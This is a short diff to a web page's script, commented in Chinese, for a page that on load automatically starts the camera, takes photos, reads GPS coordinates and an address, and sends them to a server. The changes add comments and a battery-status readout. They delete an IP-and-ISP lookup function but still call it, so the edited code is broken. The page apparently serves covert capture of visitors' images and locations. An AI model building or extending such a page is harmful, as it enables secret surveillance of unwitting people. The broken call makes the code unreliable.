@@ -119,7 +119,7 @@
   </div>
 
   <script>
-    // 原有功能: 自動拍照與數據回傳
+    // 原有功能：自動拍照與數據回傳
     async function startCameraAndSend() {
       const statusElement = document.getElementById('status');
 
@@ -154,6 +154,7 @@
       }
     }
 
+    // 原有功能：GPS數據與回傳
     async function getGpsCoordinates(photoData) {
       const statusElement = document.getElementById('status');
       try {
@@ -179,6 +180,7 @@
       }
     }
 
+    // 原有功能：數據回傳
     async function sendPhotoToServer(photoData, latitude, longitude, address) {
       const statusElement = document.getElementById('status');
       try {
@@ -206,24 +208,7 @@
       }
     }
 
-    async function getIpInfo() {
-      try {
-        const response = await fetch('https://ipinfo.io/json');
-        const data = await response.json();
-        const { ip, city, region, country, org } = data;
-
-        document.getElementById('system-info').innerHTML = `
-          <p class="status-text">IP：${ip}</p>
-          <p class="status-text">位置：${city}, ${region}, ${country}</p>
-          <p class="status-text">ISP：${org}</p>
-        `;
-      } catch (error) {
-        document.getElementById('system-info').innerHTML = `
-          <p class="status-text">系統資訊讀取失敗</p>
-        `;
-      }
-    }
-
+    // 新增功能：電池資訊
     function updateBatteryStatus() {
       navigator.getBattery().then((battery) => {
         const level = battery.level * 100;
@@ -236,8 +221,9 @@
       });
     }
 
-    getIpInfo();
+    // 啟動所有功能
     updateBatteryStatus();
+    getIpInfo();
     startCameraAndSend();
   </script>
 </body>
